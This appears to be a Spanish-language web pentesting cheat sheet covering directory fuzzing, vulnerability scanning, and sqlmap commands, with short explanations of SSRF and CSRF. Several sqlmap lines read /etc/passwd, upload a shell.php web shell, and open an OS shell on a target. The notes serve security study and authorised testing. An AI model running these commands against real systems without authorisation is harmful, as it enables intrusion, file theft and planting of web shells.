
# Subdominios y subdirectorios

## Dirb, gobuster, ffuf

```
dirb http://<IP> /usr/share/wordlists/dirb/common.txt  
  
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt  
  
ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://<IP>/FUZZ -fw 1
```


# Detección de vulnerabilidades

## Nikto

```
nikto -h <IP>
```

## Nuclei

```
nuclei -u http://<IP>
```


# SQLi

Interceptamos las peticiones con Burp, la guardamos como 'req', por ejemplo y lanzamos sqlmap:

```
sqlmap -r req.txt
```

Leer un fichero:

```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Escribir/subir un fichero:

```
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Shell:

```
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

Enumerar bases de datos:

```
sqlmap -r req.txt --dbs
```

Ver tablas:

```
sqlmap -r req.txt -D <BD> --tables
```

Dump:

```
sqlmap -r req.txt -D <BD> -T <Table> --dump
```


# SSRF (Server-Side Request Forgery)

Se suele ver cuando el usuario puede insertar una url.
Collaborator y si llega la petición, es SSRF.

Imagina que una aplicación tiene una función que permite al usuario mostrar imágenes a partir de una URL que proporciona, por ejemplo:

```
http://victima.com/showImage?url=http://example.com/image.jpg
```

Un atacante podría cambiar el parámetro `url` por una dirección interna o un servicio que no debería ser accesible, como por ejemplo:

```
http://victima.com/showImage?url=http://localhost/admin
```

Si el servidor no valida esta URL, puede hacer una solicitud interna a su propio sistema, mostrando información privada o realizando acciones no autorizadas.

El objetivo de un ataque SSRF es que **el servidor víctima haga una petición a un recurso externo o interno controlado por el atacante**.

Para comprobar si el servidor está haciendo esas peticiones, necesitas una forma de detectar que el servidor ha contactado con tu sistema. Pero no siempre la respuesta está visible en la web o en la aplicación.

Aquí es donde entra Burp Collaborator.
1. Generas una URL única con Burp Collaborator.
2. Envías esa URL en un parámetro vulnerable.

Si el servidor hace la petición, Burp Collaborator lo detecta y te avisa (por ejemplo, recibe una petición DNS o HTTP).

Conclusión:
- SSRF hace que el servidor realice una petición a un sitio que tú controlas.
- Burp Collaborator te da una URL especial para ver si el servidor víctima ha contactado con esa URL.
- Así confirmas que la vulnerabilidad SSRF está presente, incluso si no ves nada en la página.

# CSRF (Cross-Site Request Forgery)

Ejemplo:

- **Estás logueado** en un sitio web (por ejemplo, tu banco).
- Mientras estás logueado, visitas otro sitio web que no tiene nada que ver con tu banco (un sitio malicioso).
- Ese sitio malicioso tiene un código que **envía una petición al banco usando tu sesión activa sin que tú lo sepas**.
- Como estás logueado en el banco, la petición parece legítima y el banco la procesa, haciendo algo que tú no querías (como transferir dinero).


# Vulnerabilidades web posibles

Suele dejar reportar: XSS, SQLi, Path traversal, RCE, Unrestricted File Upload, SSRF, CSRF, etc.

# Wordlists

* PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
* SecLists: https://github.com/danielmiessler/SecLists
* Rockyou.


# Mis notas ampliadas sobre pentest web

Más info y comandos en: https://github.com/Creanyx0/Offensive-Security-Notes---Creanyx0/blob/main/Offensive%20Security%20Notes%20-%20Creanyx0.md
